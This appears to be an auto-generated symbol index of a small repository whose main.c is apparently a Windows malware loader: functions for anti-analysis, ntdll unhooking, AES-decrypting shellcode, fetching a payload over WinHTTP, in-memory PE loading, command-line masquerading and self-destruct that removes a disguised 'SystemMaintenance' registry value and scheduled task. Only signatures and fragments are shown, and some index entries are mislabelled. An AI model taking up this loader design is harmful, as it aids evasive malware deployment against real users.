# Subsystem: root

## aes.py
- Layer: utility
- Language: py
- Symbols:
  - `AESencrypt` (function, line 7) `def AESencrypt(plaintext, key)`
  - `dropFile` (function, line 15) `def dropFile(key, ciphertext)`

## app.py
- Layer: utility
- Doc: _*_ coding: utf8 _*_
- Language: py

## install.sh
- Layer: utility
- Language: sh

## main.c
- Layer: utility
- Language: c
- Symbols:
  - `_BASE_RELOCATION_ENTRY` (struct, line 57)
  - `DATA` (struct, line 62)
  - `NTSTATUS` (type_alias, line 54) `typedef LONG NTSTATUS;`
  - `12` (type_alias, line 56) `typedef struct _BASE_RELOCATION_ENTRY { WORD Offset : 12;`
  - `hookGetCommandLineW` (function, line 106) `LPWSTR hookGetCommandLineW()`
  - `hookGetCommandLineA` (function, line 107) `LPSTR hookGetCommandLineA()`
  - `hook__p___argv` (function, line 108) `char*** __cdecl hook__p___argv(void)`
  - `hook__p___wargv` (function, line 109) `wchar_t*** __cdecl hook__p___wargv(void)`
  - `hook__p___argc` (function, line 110) `int* __cdecl hook__p___argc(void)`
  - `anti_analysis` (function, line 115) `BOOL anti_analysis()`
  - `selfDestruct` (function, line 139) `void selfDestruct()`
  - `hook__wgetmainargs` (function, line 195) `int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)`
  - `hook__getmainargs` (function, line 201) `int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)`
  - `hookexit` (function, line 207) `int __cdecl hookexit(int status)`
  - `hookExitProcess` (function, line 212) `void __stdcall hookExitProcess(UINT statuscode)`
  - `masqueradeCmdline` (function, line 216) `void masqueradeCmdline()`
  - `freeargvA` (function, line 254) `void freeargvA(char** array, int Argc)`
  - `freeargvW` (function, line 262) `void freeargvW(wchar_t** array, int Argc)`
  - `GetNTHeaders` (function, line 270) `char* GetNTHeaders(char* pe_buffer)`
  - `GetPEDirectory` (function, line 282) `IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)`
  - `RepairIAT` (function, line 292) `BOOL RepairIAT(PVOID modulePtr)`
  - `_stricmp` (function, line 347) `_stricmp(func_name, "exit") == 0 ||
                    _stricmp(func_name, "_Exit") == 0 ||
    ...`
  - `RunPE` (function, line 367) `DWORD WINAPI RunPE(LPVOID lpParameter)`
  - `PELoader` (function, line 373) `void PELoader(char* data, DWORD datasize)`
  - `getNtdll` (function, line 447) `LPVOID getNtdll()`
  - `Unhook` (function, line 490) `BOOL Unhook(LPVOID cleanNtdll)`
  - `DecryptAES` (function, line 526) `void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen)`
  - `GetData` (function, line 559) `DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource)`
  - `main` (function, line 661) `int main(int argc, char** argv)`
  - `RegCloseKey` (function, line 124) `RegCloseKey(hKey);`
  - `printf` (function, line 141) `printf("[*] Initiating self-destruct...\n");`
  - `fflush` (function, line 142) `fflush(stdout);`
  - `RegDeleteValueA` (function, line 155) `RegDeleteValueA(hKey, "SystemMaintenance");`
  - `system` (function, line 160) `system("schtasks /delete /tn \"SystemMaintenanceTask\" /f > nul 2>&1");`
  - `CloseHandle` (function, line 184) `CloseHandle(pi.hThread);`
  - `ExitProcess` (function, line 192) `ExitProcess(0);`
  - `ExitThread` (function, line 209) `ExitThread(0);`
  - `MultiByteToWideChar` (function, line 221) `MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);`
  - `free` (function, line 225) `free(sz_masqCmd_Widh);`
  - `LocalFree` (function, line 238) `LocalFree(poi_masqArgvW);`
  - `entryPoint` (function, line 370) `entryPoint();`
  - `NTSTATUS` (function, line 390) `typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);`
  - `NtUnmapViewOfSection` (function, line 393) `NtUnmapViewOfSection(NtCurrentProcess(), preferAddr);`
  - `memcpy` (function, line 407) `memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);`
  - `VirtualFree` (function, line 413) `VirtualFree(pImageBase, 0, MEM_RELEASE);`
  - `WaitForSingleObject` (function, line 439) `WaitForSingleObject(hThread, INFINITE);`
  - `ep` (function, line 444) `ep();`
  - `TerminateProcess` (function, line 461) `TerminateProcess(pi.hProcess, 0);`
  - `WideCharToMultiByte` (function, line 569) `WideCharToMultiByte(CP_UTF8, 0, wresource, -1, resourceA, sizeof(resourceA)-1, NULL, NULL);`
  - `WinHttpCloseHandle` (function, line 582) `WinHttpCloseHandle(hSession);`
  - `ZeroMemory` (function, line 617) `ZeroMemory(pszOutBuffer, dwSize + 1);`
  - `srand` (function, line 663) `srand(GetTickCount());`
  - `Sleep` (function, line 723) `Sleep(3000);`
  - `_CRT_RAND_S` (macro, line 35) `#define _CRT_RAND_S`
  - `NT_SUCCESS` (macro, line 46) `#define NT_SUCCESS(Status)`
  - `NtCurrentThread` (macro, line 48) `#define NtCurrentThread()`
  - `NtCurrentProcess` (macro, line 50) `#define NtCurrentProcess()`
  - `_CRT_SECURE_NO_WARNINGS` (macro, line 53) `#define _CRT_SECURE_NO_WARNINGS`
